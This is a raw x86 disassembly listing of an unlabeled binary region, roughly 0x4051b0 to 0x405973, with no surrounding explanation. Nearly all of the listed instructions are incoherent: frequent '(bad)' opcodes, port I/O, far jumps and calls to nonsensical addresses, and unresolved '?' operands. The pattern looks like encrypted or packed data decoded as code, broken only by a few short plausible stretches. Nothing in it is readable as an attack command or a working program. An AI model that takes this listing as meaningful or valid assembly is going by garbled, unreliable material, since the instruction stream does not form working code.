  4051b0:	test   al,0xc6
  4051b2:	rol    DWORD PTR [edi+0x19],0xeb
  4051b6:	or     eax,0xc4465906
  4051bb:	ja     0x405162
  4051bd:	and    ecx,DWORD PTR [ecx]
  4051bf:	mov    ds:0x8c46b097,al
  4051c4:	scas   eax,DWORD PTR es:[edi]
  4051c5:	loope  0x40518d
  4051c7:	in     eax,dx
  4051c8:	xor    BYTE PTR [edx-0x18],ah
  4051cb:	inc    eax
  4051cc:	imul   edi,ebx,0xffffffdb
  4051cf:	lds    esi,FWORD PTR [ecx+edx*2+0x3432a84e]
  4051d6:	mov    bh,0x7c
  4051d8:	(bad)  
  4051d9:	mov    dl,0x17
  4051db:	fild   WORD PTR [eax-0x16]
  4051de:	sbb    eax,0xfe557ec0
  4051e3:	int3   
  4051e4:	mov    BYTE PTR [ebx+esi*2],ch
  4051e7:	test   DWORD PTR [ecx-0x36],edi
  4051ea:	leave  
  4051eb:	iret   
  4051ec:	int    0xbc
  4051ee:	ror    ebx,1
  4051f0:	mov    edx,0xcc571979
  4051f5:	leave  
  4051f6:	aad    0x6a
  4051f8:	push   ds
  4051f9:	fs retf 
  4051fb:	dec    ebp
  4051fc:	es (bad) 
  4051fe:	jge    0x40520b
  405200:	mov    ds:0x2e7c58f2,al
  405205:	pop    eax
  405206:	sub    dh,BYTE PTR [edx]
  405208:	dec    ebx
  405209:	mov    eax,ds:0xadc98a9f
  40520e:	test   DWORD PTR [edi-0x76],0xf73c2d89
  405215:	arpl   si,ax
  405217:	sub    dl,cl
  405219:	jp     0x405296
  40521b:	popf   
  40521c:	mov    edx,ecx
  40521e:	pop    ds
  40521f:	mov    bl,0x73
  405221:	or     edx,0x17
  405224:	aad    0x13
  405226:	pop    esi
  405227:	(bad)  
  405228:	sub    eax,0xede67dab
  40522d:	mov    al,ds:0x3cb56d5d
  405232:	lock xor dl,BYTE PTR [esi]
  405235:	xor    edi,DWORD PTR [ecx-0x4eaebace]
  40523b:	jbe    0x405245
  40523d:	stos   DWORD PTR es:[edi],eax
  40523e:	out    0x4,eax
  405240:	jno    0x40522c
  405242:	jg     0x405261
  405244:	cwde   
  405245:	fdiv   QWORD PTR [edi+0x14]
  405248:	aad    0x6
  40524a:	mov    ?,eax
  40524c:	sub    esi,edx
  40524e:	sbb    BYTE PTR [esi+0x5b],bh
  405251:	sbb    cl,BYTE PTR [eax]
  405253:	mov    dl,0x4a
  405255:	pop    edi
  405256:	push   edi
  405257:	jbe    0x4051ea
  405259:	inc    esp
  40525a:	seta   BYTE PTR [edi+eax*2-0x34]
  40525f:	sbb    esp,ebp
  405261:	jnp    0x405230
  405263:	mov    eax,ds:0x678acdeb
  405268:	sub    al,0x6f
  40526a:	popa   
  40526b:	mov    edi,0xd6aafdf1
  405270:	pop    edx
  405271:	loope  0x40527a
  405273:	imul   ebx,DWORD PTR [edi-0x4856cd0f],0x25
  40527a:	sbb    al,0xca
  40527c:	xor    esp,0x85f34fa2
  405282:	in     eax,dx
  405283:	imul   DWORD PTR [edx+0x14a405a6]
  405289:	mov    eax,ds:0x4aeb479a
  40528e:	mov    esi,?
  405290:	(bad)  
  405291:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405292:	out    dx,al
  405293:	or     esi,ebp
  405295:	jae    0x405304
  405297:	in     eax,dx
  405298:	nop
  405299:	sub    BYTE PTR [eax+0x0],bl
  40529c:	dec    edi
  40529d:	mov    bh,0x4
  40529f:	mov    ch,BYTE PTR [ebx]
  4052a1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4052a2:	inc    esp
  4052a3:	outs   dx,DWORD PTR ds:[esi]
  4052a4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4052a5:	xchg   esp,eax
  4052a6:	jno    0x40523d
  4052a8:	pop    esi
  4052a9:	cld    
  4052aa:	outs   dx,BYTE PTR ds:[esi]
  4052ab:	mov    edi,0xba14eeb3
  4052b0:	mov    edi,0x4d06a86f
  4052b5:	ror    BYTE PTR [eax+eiz*1],0xfb
  4052b9:	cmp    esp,edx
  4052bb:	or     eax,ebp
  4052bd:	jne    0x405318
  4052bf:	fwait
  4052c0:	push   esp
  4052c1:	pop    esi
  4052c2:	cmp    BYTE PTR [edi+0x5e41e7bc],bl
  4052c8:	xchg   ebx,eax
  4052c9:	inc    esi
  4052ca:	add    eax,0x1e24f5d8
  4052cf:	mov    eax,ds:0x17973e60
  4052d4:	(bad)  
  4052d5:	or     edx,DWORD PTR [ecx-0xd]
  4052d8:	lods   eax,DWORD PTR ds:[esi]
  4052d9:	pop    ebp
  4052da:	(bad)  [edx-0x65183bc2]
  4052e0:	adc    DWORD PTR [edi-0x6e21b7e8],0x79
  4052e7:	sub    DWORD PTR [ebp+0x42],0x273ff761
  4052ee:	adc    DWORD PTR [edi-0x6e],0xffffffa5
  4052f2:	add    ebp,DWORD PTR [edx]
  4052f4:	(bad)  
  4052f5:	outs   dx,BYTE PTR ds:[esi]
  4052f6:	or     DWORD PTR [eax+0x71238672],esi
  4052fc:	ret    
  4052fd:	mov    ds:0x326907d1,eax
  405302:	std    
  405303:	or     eax,0xb9824d07
  405308:	ret    
  405309:	add    DWORD PTR [ebx],ebx
  40530b:	test   DWORD PTR [edx],0x2689005c
  405311:	inc    ecx
  405312:	pop    ebp
  405313:	xor    ebx,ecx
  405315:	test   BYTE PTR [edx+0x3e0b588e],cl
  40531b:	mov    esi,esi
  40531d:	cmp    BYTE PTR [eax+0x46],0x6c
  405321:	lds    eax,FWORD PTR [eax+0x47d5e87b]
  405327:	les    esp,FWORD PTR [ebx-0x30]
  40532a:	jae    0x4052d4
  40532c:	mov    ah,al
  40532e:	repnz pop ebx
  405330:	push   ecx
  405331:	add    DWORD PTR [eax-0x207ca79a],0x35
  405338:	push   esi
  405339:	out    0xfc,eax
  40533b:	fdiv   DWORD PTR [eax]
  40533d:	and    al,0x77
  40533f:	gs (bad) 
  405341:	pop    ss
  405342:	add    DWORD PTR [edi+0x53426c17],edx
  405348:	(bad)  [ebp-0x5f17bdd0]
  40534e:	add    ebx,DWORD PTR [esi+0x179fc56b]
  405354:	aad    0x5d
  405356:	pop    es
  405357:	aad    0x9a
  405359:	jle    0x4052f7
  40535b:	sub    dh,BYTE PTR [ecx-0x985ee37]
  405361:	mov    bh,0x44
  405363:	cs add al,0xff
  405366:	mov    bh,0x77
  405368:	cmp    al,0x8
  40536a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40536b:	push   0xffffffb9
  40536d:	test   al,0x53
  40536f:	das    
  405370:	cmp    esp,ebp
  405372:	sub    ecx,esp
  405374:	loope  0x4053cb
  405376:	test   BYTE PTR cs:[edx+0x21],ah
  40537a:	sar    DWORD PTR [edi],1
  40537c:	or     BYTE PTR [edi-0x7c],0xf1
  405380:	or     al,0xb9
  405382:	jmp    DWORD PTR [edi+0x1183f4bd]
  405388:	in     al,0x6e
  40538a:	ins    BYTE PTR es:[edi],dx
  40538b:	mov    ebx,0xcdb1f5bd
  405390:	arpl   WORD PTR [ebp-0x23],ax
  405393:	sar    BYTE PTR [ebp+esi*4+0x14],1
  405397:	or     DWORD PTR [ebx],edx
  405399:	sbb    ebp,esi
  40539b:	int3   
  40539c:	or     esp,DWORD PTR [eax]
  40539e:	or     dh,dl
  4053a0:	inc    edx
  4053a1:	dec    esi
  4053a2:	dec    DWORD PTR ds:0x22954804
  4053a8:	pop    esp
  4053a9:	sbb    DWORD PTR [edi-0x968942c],esp
  4053af:	jl     0x4053d0
  4053b1:	pop    ds
  4053b2:	push   cs
  4053b3:	inc    eax
  4053b4:	sub    bh,ah
  4053b6:	or     eax,0xab4a5ee6
  4053bb:	daa    
  4053bc:	in     eax,0x1b
  4053be:	cmp    esp,DWORD PTR [edi]
  4053c0:	pop    ebx
  4053c1:	imul   ebx,DWORD PTR [eax-0x14ebf806],0xffffffc8
  4053c8:	mov    eax,ds:0x45b151c0
  4053cd:	fist   DWORD PTR [eax-0x32c2c552]
  4053d3:	test   BYTE PTR [ebx-0xf],ah
  4053d6:	into   
  4053d7:	repnz push ss
  4053d9:	xor    DWORD PTR [ebp-0x5d],edi
  4053dc:	push   edx
  4053dd:	(bad)
  4053e0:	add    DWORD PTR [ebp+0x1b],edx
  4053e3:	ins    DWORD PTR es:[edi],dx
  4053e4:	inc    ecx
  4053e5:	and    eax,0x6480cb99
  4053ea:	hlt    
  4053eb:	retf   0xe0ec
  4053ee:	jmp    0x40540b
  4053f0:	cld    
  4053f1:	push   ds
  4053f2:	mov    dl,0x93
  4053f4:	out    0x1b,al
  4053f6:	push   0xf6027109
  4053fb:	mov    dh,0x7a
  4053fd:	into   
  4053fe:	xchg   BYTE PTR [eax+0x73],ch
  405401:	ror    BYTE PTR [ebx+0x2a],cl
  405404:	aaa    
  405405:	call   0x9b610af4
  40540a:	cmp    DWORD PTR [edi-0x5],esp
  40540d:	and    edi,DWORD PTR [edi-0x7b]
  405410:	cmp    DWORD PTR [eax],esp
  405412:	pop    ebx
  405413:	or     al,0xea
  405415:	lea    ebp,[ebp-0x15]
  405418:	mov    cl,al
  40541a:	push   edi
  40541b:	scas   eax,DWORD PTR es:[edi]
  40541c:	in     eax,dx
  40541d:	pushf  
  40541e:	out    dx,eax
  40541f:	xchg   edi,eax
  405420:	js     0x40546e
  405422:	in     eax,0x0
  405424:	fmul   QWORD PTR [ebx-0x5d]
  405427:	jnp    0x405442
  405429:	outs   dx,BYTE PTR ds:[esi]
  40542a:	jmp    0x91c655e1
  40542f:	adc    al,0x3d
  405431:	jmp    0xe8c2:0xe5eac646
  405438:	adc    DWORD PTR [edi-0x22],edx
  40543b:	or     ch,0x4a
  40543e:	sbb    ebp,DWORD PTR [ecx-0x2ebcd17]
  405444:	mov    ds:0x93c54ed3,eax
  405449:	mov    esi,0x8ed7efe6
  40544e:	push   ecx
  40544f:	shl    DWORD PTR ds:0xdf0a0fcb,0xa1
  405456:	cmp    ch,BYTE PTR [edi]
  405458:	jne    0x405442
  40545a:	in     eax,0xc1
  40545c:	aad    0x23
  40545e:	out    dx,al
  40545f:	inc    DWORD PTR [ebx]
  405461:	sbb    al,0x87
  405463:	in     al,dx
  405464:	mov    gs,WORD PTR [ecx]
  405466:	daa    
  405467:	fwait
  405468:	cwde   
  405469:	cld    
  40546a:	jg     0x405460
  40546c:	mov    ah,0x4e
  40546e:	jmp    0x6806:0x62856c63
  405475:	jecxz  0x40545f
  405477:	adc    BYTE PTR [eax+eax*4],ch
  40547a:	add    ebp,esp
  40547c:	shr    BYTE PTR [edi-0x39],1
  40547f:	test   eax,0xcc2c95e
  405484:	add    BYTE PTR [ebp-0x75],dl
  405487:	in     al,dx
  405488:	push   ecx
  405489:	mov    edx,DWORD PTR ds:0x42e784
  40548f:	mov    edx,DWORD PTR [edx]
  405491:	sbb    DWORD PTR ds:0x42e6eb,edx
  405497:	jmp    0x40576a
  40549c:	pop    ecx
  40549d:	scas   al,BYTE PTR es:[edi]
  40549e:	sbb    BYTE PTR [ebx-0xd],al
  4054a1:	push   ecx
  4054a2:	pop    ecx
  4054a3:	mov    dh,0xd4
  4054a5:	(bad)
  4054a8:	jmp    0x10cbd7a8
  4054ad:	aaa    
  4054ae:	jo     0x405520
  4054b0:	stos   BYTE PTR es:[edi],al
  4054b1:	jle    0x405523
  4054b3:	jo     0x405513
  4054b5:	jae    0x40544d
  4054b7:	jbe    0x405487
  4054b9:	pop    ds
  4054ba:	adc    BYTE PTR [eax+ebp*4-0xe8ac231],dh
  4054c1:	xlat   BYTE PTR ds:[ebx]
  4054c2:	mov    ebx,0xfc0ec37f
  4054c7:	sahf   
  4054c8:	and    BYTE PTR [edi],0x31
  4054cb:	mov    dl,BYTE PTR [ebx-0x50]
  4054ce:	push   es
  4054cf:	mov    ch,0x17
  4054d1:	jo     0x40549a
  4054d3:	pop    ss
  4054d4:	xchg   ecx,eax
  4054d5:	xor    al,0x79
  4054d7:	loopne 0x4054ba
  4054d9:	jp     0x40552a
  4054db:	in     al,0x29
  4054dd:	mov    edx,0x4fa20a4a
  4054e2:	sub    cl,dl
  4054e4:	enter  0xcaf8,0x51
  4054e8:	loop   0x40551a
  4054ea:	cdq    
  4054eb:	push   cs
  4054ec:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4054ed:	loope  0x4054ba
  4054ef:	cmp    DWORD PTR [ecx],eax
  4054f1:	jnp    0x4054c2
  4054f3:	call   0x2b6a:0xc956cc5e
  4054fa:	xchg   edi,eax
  4054fb:	lods   eax,DWORD PTR ds:[esi]
  4054fc:	xor    DWORD PTR [edi-0x7c],ebp
  4054ff:	add    ecx,DWORD PTR [edx-0x26]
  405502:	arpl   WORD PTR [edi+0x78],sp
  405505:	xchg   esi,eax
  405506:	push   es
  405507:	stos   BYTE PTR es:[edi],al
  405508:	pop    eax
  405509:	push   ebp
  40550a:	ret    
  40550b:	js     0x4054bb
  40550d:	sahf   
  40550e:	xchg   esi,eax
  40550f:	leave  
  405510:	push   edx
  405511:	push   edx
  405512:	pop    ecx
  405513:	xchg   ebx,eax
  405514:	test   eax,0xa66256bc
  405519:	dec    ecx
  40551a:	fdivr  st(0),st
  40551c:	pop    ss
  40551d:	cmp    al,bh
  40551f:	arpl   dx,di
  405521:	and    al,0x6a
  405523:	cmp    al,ch
  405525:	aad    0xda
  405527:	mov    esi,0xeeb26732
  40552c:	mov    ebx,edi
  40552e:	mov    esi,0x79619e9b
  405533:	pop    esp
  405534:	(bad)
  405538:	ins    BYTE PTR es:[edi],dx
  405539:	xor    BYTE PTR [ebp+ecx*1-0x32],bh
  40553d:	pushf  
  40553e:	push   es
  40553f:	mov    bl,0x5d
  405541:	stos   BYTE PTR es:[edi],al
  405542:	jb     0x405522
  405544:	in     al,0x91
  405546:	pop    edx
  405547:	push   esp
  405548:	sbb    DWORD PTR [eax-0x5709e995],0x24694347
  405552:	data16 mov dh,0x4d
  405555:	adc    cl,cl
  405557:	pop    esp
  405558:	and    BYTE PTR [ecx+0x32],bh
  40555b:	out    dx,eax
  40555c:	cdq    
  40555d:	fwait
  40555e:	sub    BYTE PTR [ebx+0x38ec5918],dh
  405564:	push   edx
  405565:	int3   
  405566:	inc    ebp
  405567:	push   edx
  405568:	data16 test al,0xf8
  40556b:	ins    BYTE PTR es:[edi],dx
  40556c:	cmp    al,0xed
  40556e:	imul   eax,DWORD PTR [edx+0x36242e8d],0xdd5971f1
  405578:	push   cs
  405579:	cmp    bh,BYTE PTR [edi-0x3551f73e]
  40557f:	fnsave [edi-0x11]
  405582:	mov    ah,0x92
  405584:	call   0x34a8c89c
  405589:	mov    al,0x76
  40558b:	sbb    bl,al
  40558d:	xor    eax,0x46b32695
  405592:	mov    ebx,0x50665746
  405597:	push   edx
  405598:	ret    0x3f5e
  40559b:	imul   ebx,DWORD PTR [edx+edx*8],0xffffff99
  40559f:	int3   
  4055a0:	out    dx,al
  4055a1:	sar    cl,1
  4055a3:	jmp    0x36b4cb34
  4055a8:	aad    0x74
  4055aa:	bound  eax,QWORD PTR [edi+0x52d50923]
  4055b0:	xor    ch,cl
  4055b2:	push   ds
  4055b3:	cmp    DWORD PTR [ecx+0x0],0xbdd5471d
  4055ba:	sub    ch,BYTE PTR [ecx+0x5de4fb40]
  4055c0:	scas   al,BYTE PTR es:[edi]
  4055c1:	adc    esp,DWORD PTR [edx+0x4]
  4055c4:	jne    0x4055cd
  4055c6:	mov    ecx,0x8b88871b
  4055cb:	(bad)  
  4055cd:	pop    eax
  4055ce:	clc    
  4055cf:	cmp    dh,BYTE PTR [edx-0x442b673c]
  4055d5:	adc    eax,0x20184af6
  4055da:	(bad)  [eax-0x1a5e4054]
  4055e0:	jno    0x405635
  4055e2:	sub    esi,DWORD PTR [eax-0x7898e5c2]
  4055e8:	call   0xdd18:0x7bc07240
  4055ef:	or     al,0x83
  4055f1:	jmp    0x405606
  4055f3:	sar    BYTE PTR [ebp-0x73389b5b],cl
  4055f9:	mov    ds:0x4b1ba0db,al
  4055fe:	icebp  
  4055ff:	mov    ebp,0xd94a184a
  405604:	inc    ebx
  405605:	es push es
  405607:	lds    ebx,FWORD PTR [eax-0x3a]
  40560a:	scas   al,BYTE PTR es:[edi]
  40560b:	aad    0x74
  40560d:	daa    
  40560e:	cmp    cl,BYTE PTR [ecx+esi*8-0x6ef8a08e]
  405615:	in     al,dx
  405616:	dec    esp
  405617:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405618:	pusha  
  405619:	test   DWORD PTR [esi-0x32e6e0bc],ebx
  40561f:	(bad)  
  405620:	xlat   BYTE PTR ds:[ebx]
  405621:	and    eax,0x4e1cd381
  405626:	push   edx
  405627:	jno    0x405642
  405629:	dec    edi
  40562a:	xor    BYTE PTR [ebx],0xf5
  40562d:	inc    edi
  40562e:	rol    DWORD PTR [edx],0xf3
  405631:	lods   eax,DWORD PTR ds:[esi]
  405632:	fwait
  405633:	pop    esp
  405634:	dec    esi
  405635:	shl    ebp,cl
  405637:	mov    ecx,0xba4d1955
  40563c:	das    
  40563d:	add    bh,BYTE PTR [ebx+0x1510ceef]
  405643:	bound  eax,QWORD PTR [ebx+0x6c]
  405646:	cs (bad) 
  405648:	loopne 0x40562f
  40564a:	cld    
  40564b:	xor    al,0x89
  40564d:	std    
  40564e:	sbb    cl,BYTE PTR [edi-0x12dc0db5]
  405654:	ins    DWORD PTR es:[edi],dx
  405655:	ret    0x6b55
  405658:	pop    edi
  405659:	popf   
  40565a:	ja     0x405616
  40565c:	mov    WORD PTR [ebx+0x40],?
  40565f:	out    dx,eax
  405660:	jg     0x4056ba
  405662:	ins    DWORD PTR es:[edi],dx
  405663:	or     al,0x26
  405665:	out    0xff,al
  405667:	pop    esp
  405668:	mov    ?,esi
  40566a:	lods   al,BYTE PTR ds:[esi]
  40566b:	pop    ecx
  40566c:	lds    esp,FWORD PTR [ebx+0x4e]
  40566f:	dec    edx
  405670:	cmp    al,BYTE PTR [eax-0x74]
  405673:	dec    ebp
  405674:	outs   dx,BYTE PTR ds:[esi]
  405675:	mov    dl,0x28
  405677:	or     edi,DWORD PTR [edx-0x4f0307b7]
  40567d:	fcmovne st,st(1)
  40567f:	stc    
  405680:	pop    ds
  405681:	test   BYTE PTR [ecx+0x68],cl
  405684:	fisub  WORD PTR [edx+0x65ad5cb4]
  40568a:	lods   al,BYTE PTR ds:[esi]
  40568b:	retf   
  40568c:	pop    esp
  40568d:	or     esi,DWORD PTR [edx-0x783b8e08]
  405693:	ret    0x2c73
  405696:	outs   dx,BYTE PTR fs:[esi]
  405698:	sbb    al,0x1f
  40569a:	leave  
  40569b:	ror    DWORD PTR [edi-0x1170c4d9],0xcc
  4056a2:	jns    0x4056e5
  4056a4:	test   eax,edi
  4056a6:	jns    0x4056a4
  4056a8:	dec    esi
  4056a9:	clc    
  4056aa:	cdq    
  4056ab:	fucomp st(4)
  4056ad:	sbb    ch,BYTE PTR [ebx]
  4056af:	test   BYTE PTR [edi-0x6c],dl
  4056b2:	test   ebp,ecx
  4056b4:	scas   al,BYTE PTR es:[edi]
  4056b5:	mov    ah,0x38
  4056b7:	cdq    
  4056b8:	xchg   edx,eax
  4056b9:	xchg   BYTE PTR [esi],dh
  4056bb:	inc    BYTE PTR [esi+0xbf455a2]
  4056c1:	pop    edx
  4056c2:	cs jecxz 0x405711
  4056c5:	jmp    0x405696
  4056c7:	add    BYTE PTR [edx-0x47],cl
  4056ca:	mov    bh,0x8a
  4056cc:	fbld   TBYTE PTR ds:0x675bbf47
  4056d2:	cld    
  4056d3:	fisttp QWORD PTR ds:0x2b445a57
  4056d9:	addr16 push 0x5f76ac2e
  4056df:	loopne 0x40569e
  4056e1:	push   cs
  4056e2:	sub    dl,BYTE PTR [eax]
  4056e4:	xor    BYTE PTR [ebx],ch
  4056e6:	shr    DWORD PTR [ebp-0x2064d264],cl
  4056ec:	(bad)  
  4056ed:	adc    cl,BYTE PTR [ecx-0x469c41b0]
  4056f3:	dec    ecx
  4056f4:	cdq    
  4056f5:	inc    ebp
  4056f6:	ror    DWORD PTR ds:0xb8300834,1
  4056fc:	xchg   edx,eax
  4056fd:	sub    al,al
  4056ff:	lds    edx,FWORD PTR [edi]
  405701:	cmp    edi,DWORD PTR [esi+0x31e3ef77]
  405707:	and    bl,BYTE PTR [eax]
  405709:	pushf  
  40570a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40570b:	sahf   
  40570c:	xchg   ebp,eax
  40570d:	ja     0x40574c
  40570f:	shl    DWORD PTR [ebp+0x7b869828],cl
  405715:	pop    edi
  405716:	push   cs
  405717:	push   ss
  405718:	ja     0x4056df
  40571a:	inc    eax
  40571b:	call   0xdcf3:0x695f90c0
  405722:	bound  edx,QWORD PTR [ebp+0x2d2642fe]
  405728:	adc    eax,0xdcc05e19
  40572d:	rcr    BYTE PTR [esi+0x641b4a52],1
  405733:	push   eax
  405734:	call   0xbe69:0xfb755d8b
  40573b:	outs   dx,BYTE PTR ds:[esi]
  40573c:	jb     0x405736
  40573e:	adc    bl,BYTE PTR [ebp-0x64]
  405741:	dec    esp
  405742:	shl    cl,cl
  405744:	dec    ebx
  405745:	fwait
  405746:	mov    DWORD PTR [edi],ebx
  405748:	mov    ch,0x27
  40574a:	imul   ebp,DWORD PTR [edx],0x1a
  40574d:	push   eax
  40574e:	stos   DWORD PTR es:[edi],eax
  40574f:	and    al,0xab
  405751:	out    dx,al
  405752:	push   cs
  405753:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405754:	repnz scas al,BYTE PTR es:[edi]
  405756:	xchg   esp,eax
  405757:	xchg   DWORD PTR [ebx-0x3b73244c],esp
  40575d:	push   eax
  40575e:	das    
  40575f:	pop    eax
  405760:	push   edi
  405761:	(bad)  
  405762:	es push es
  405764:	xor    DWORD PTR [edi+0x52],edi
  405767:	iret   
  405768:	cmp    al,bl
  40576a:	push   ecx
  40576b:	movzx  eax,WORD PTR ds:0x42fd86
  405772:	and    eax,DWORD PTR ds:0x42fd7a
  405778:	mov    ds:0x42fd86,eax
  40577d:	jmp    0x405a50
  405782:	ja     0x4057cf
  405784:	and    eax,0x717221b4
  405789:	dec    ebx
  40578a:	xchg   DWORD PTR [edx-0x758d6e42],eax
  405790:	mov    ebp,0x70354ac0
  405795:	jo     0x405741
  405797:	jle    0x405809
  405799:	jo     0x4057ed
  40579b:	ins    BYTE PTR es:[edi],dx
  40579c:	stos   BYTE PTR es:[edi],al
  40579d:	jge    0x40574b
  40579f:	pop    ebx
  4057a0:	dec    ecx
  4057a1:	pop    eax
  4057a2:	jbe    0x40573a
  4057a4:	cli    
  4057a5:	mov    al,ds:0xc725f82d
  4057aa:	dec    edx
  4057ab:	fisubr WORD PTR [ebp-0x28122790]
  4057b1:	nop
  4057b2:	rol    BYTE PTR [ebx+0x5e44791a],cl
  4057b8:	adc    dl,dh
  4057ba:	popa   
  4057bb:	mov    al,0x80
  4057bd:	jae    0x4057f9
  4057bf:	cmp    al,BYTE PTR [esi]
  4057c1:	je     0x4057ef
  4057c3:	call   0xca568686
  4057c8:	pushf  
  4057c9:	daa    
  4057ca:	xchg   DWORD PTR [esi],ebp
  4057cc:	push   ebx
  4057cd:	cli    
  4057ce:	inc    cx
  4057d0:	mov    bl,0xd1
  4057d2:	add    BYTE PTR [eax-0x16],cl
  4057d5:	call   0xd87f:0x5c5610b2
  4057dc:	dec    edx
  4057dd:	imul   BYTE PTR ds:0x55b7b6b0
  4057e3:	test   eax,0x5d98844c
  4057e8:	ds out dx,eax
  4057ea:	scas   al,BYTE PTR es:[edi]
  4057eb:	inc    edx
  4057ec:	sub    ebx,DWORD PTR [edi+0x63]
  4057ef:	xor    al,0xf6
  4057f1:	cmp    al,0xa
  4057f3:	xchg   BYTE PTR [esi+edx*2-0x4a],bh
  4057f7:	dec    edi
  4057f8:	inc    ebx
  4057f9:	inc    esi
  4057fa:	fidivr DWORD PTR [esi+0x1be4fe84]
  405800:	rol    DWORD PTR [ecx],cl
  405802:	hlt    
  405803:	cmc    
  405804:	xchg   edi,eax
  405805:	cmovns edi,DWORD PTR [edx+0xc4c5c33]
  40580c:	sbb    eax,0x7ee2f99e
  405811:	or     ecx,DWORD PTR [ebx-0x2]
  405814:	icebp  
  405815:	imul   edx,ebx,0x1015b9b8
  40581b:	inc    ebp
  40581c:	in     al,0xce
  40581e:	shr    BYTE PTR [edi+ecx*4+0x21],cl
  405822:	lock mov dl,0x41
  405825:	or     BYTE PTR [ecx-0x4232f709],0x71
  40582c:	jmp    0x4057f1
  40582e:	aad    0xe2
  405830:	sub    al,0x1e
  405832:	or     BYTE PTR [eax-0xc],bl
  405835:	imul   esp,ecx,0x57
  405838:	xor    ebp,DWORD PTR [ecx+0x40dcfe39]
  40583e:	aaa    
  40583f:	dec    edi
  405840:	inc    ebp
  405841:	inc    ebx
  405842:	dec    edx
  405843:	dec    edi
  405844:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405845:	fadd   QWORD PTR [ebx+0x59]
  405848:	push   edx
  405849:	into   
  40584a:	(bad)  
  40584b:	and    al,0x91
  40584d:	fs stos DWORD PTR es:[edi],eax
  40584f:	ror    DWORD PTR [edx+0x51869ce5],1
  405855:	mov    ds:0x6b82eafb,eax
  40585a:	ficomp DWORD PTR [ebx-0x51f8ab07]
  405860:	sbb    al,0xaa
  405862:	dec    ebx
  405863:	fs jb  0x405869
  405866:	jns    0x4058d2
  405868:	fldenv [ebx+0xb9ffc2b]
  40586e:	pop    edi
  40586f:	(bad)  
  405870:	lds    eax,FWORD PTR [eax+0x10]
  405873:	xchg   DWORD PTR [ebx+0x70],eax
  405876:	pop    esp
  405877:	ins    DWORD PTR es:[edi],dx
  405878:	sar    BYTE PTR [edx+0x3a],1
  40587b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40587c:	adc    eax,eax
  40587e:	dec    esp
  40587f:	sub    BYTE PTR gs:[ecx+0x37],ah
  405883:	pop    ss
  405884:	ror    DWORD PTR [eax],1
  405886:	clc    
  405887:	inc    ecx
  405888:	bound  esp,QWORD PTR [ebx-0x28]
  40588b:	lock dec ecx
  40588d:	(bad)  
  40588e:	cli    
  40588f:	out    0xfe,eax
  405891:	xor    bl,BYTE PTR [eax+0x2a]
  405894:	scas   eax,DWORD PTR es:[edi]
  405895:	dec    DWORD PTR [edi-0xc]
  405898:	ins    BYTE PTR es:[edi],dx
  405899:	sub    al,0xca
  40589c:	xchg   ebp,eax
  40589d:	cmp    al,0xee
  40589f:	xor    edx,ebp
  4058a1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4058a2:	sub    al,0x7e
  4058a4:	add    bl,bl
  4058a6:	cld    
  4058a7:	mov    ebp,0xbd7e8a5d
  4058ac:	(bad)  
  4058ad:	loope  0x405882
  4058af:	mov    ch,0x22
  4058b1:	fwait
  4058b2:	push   cs
  4058b3:	(bad)  
  4058b4:	pop    esp
  4058b5:	idiv   ah
  4058b7:	scas   eax,DWORD PTR es:[edi]
  4058b8:	pusha  
  4058b9:	iret   
  4058ba:	fwait
  4058bb:	or     al,0xc9
  4058bd:	and    BYTE PTR [esi],0x54
  4058c0:	and    al,0x5e
  4058c2:	jmp    0x9a1f6ea9
  4058c7:	pop    ds
  4058c8:	cwde   
  4058c9:	mov    ebp,0x6cc08716
  4058ce:	jno    0x40590e
  4058d0:	jb     0x40591c
  4058d2:	cld    
  4058d3:	shl    BYTE PTR [ebx-0x37df7517],cl
  4058d9:	pop    es
  4058da:	dec    bh
  4058dc:	fucom  st(4)
  4058de:	stos   BYTE PTR es:[edi],al
  4058df:	leave  
  4058e0:	inc    eax
  4058e1:	in     eax,dx
  4058e2:	mov    ebx,0xa6a5fc4e
  4058e7:	dec    DWORD PTR [ebp+eax*8-0x78]
  4058eb:	mov    edi,0x11f38f6a
  4058f0:	xchg   edx,eax
  4058f1:	dec    esi
  4058f2:	xchg   ecx,eax
  4058f3:	cmp    eax,0xf29134a2
  4058f8:	loop   0x4058bb
  4058fa:	mov    al,0xb9
  4058fc:	pop    es
  4058fd:	sti    
  4058fe:	inc    esp
  4058ff:	clc    
  405900:	iret   
  405901:	and    ebp,DWORD PTR [eax]
  405903:	lea    edi,[eax-0x3]
  405906:	or     eax,0x2dad966
  40590b:	fiadd  WORD PTR [ebp+0x72]
  40590e:	cwde   
  40590f:	dec    ebp
  405910:	mov    ah,0x3b
  405912:	sub    eax,0x1a98ac5d
  405917:	idiv   BYTE PTR [eax-0x18]
  40591a:	xchg   ebx,eax
  40591b:	into   
  40591c:	iret   
  40591d:	call   0x65d5:0x699b2b74
  405924:	out    0x31,eax
  405926:	retf   0xd2a0
  405929:	aam    0xa9
  40592b:	retf   0x9f45
  40592e:	xlat   BYTE PTR ds:[ebx]
  40592f:	aaa    
  405930:	repnz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405932:	jl     0x4058fb
  405934:	in     al,dx
  405935:	and    BYTE PTR [edi+0x6e14bda6],0xb2
  40593c:	mov    ch,0x9c
  40593e:	jl     0x405985
  405940:	repz shr BYTE PTR [esi+0x54],cl
  405944:	mov    BYTE PTR [eax+0x5a8f002a],al
  40594a:	mov    cl,0xc7
  40594c:	xor    al,0x3e
  40594e:	aas    
  40594f:	jo     0x405937
  405951:	dec    esp
  405952:	sti    
  405953:	and    DWORD PTR [eax+0x54a3b733],edi
  405959:	inc    ebp
  40595a:	mov    edi,0xfbca3a2c
  40595f:	inc    edx
  405960:	xor    BYTE PTR [edx],al
  405962:	sahf   
  405963:	jae    0x40597f
  405965:	test   eax,0x124f11a9
  40596a:	cli    
  40596b:	mov    BYTE PTR [esi+0x264c330a],ah
  405971:	or     ebp,ecx
  405973:	(bad)  
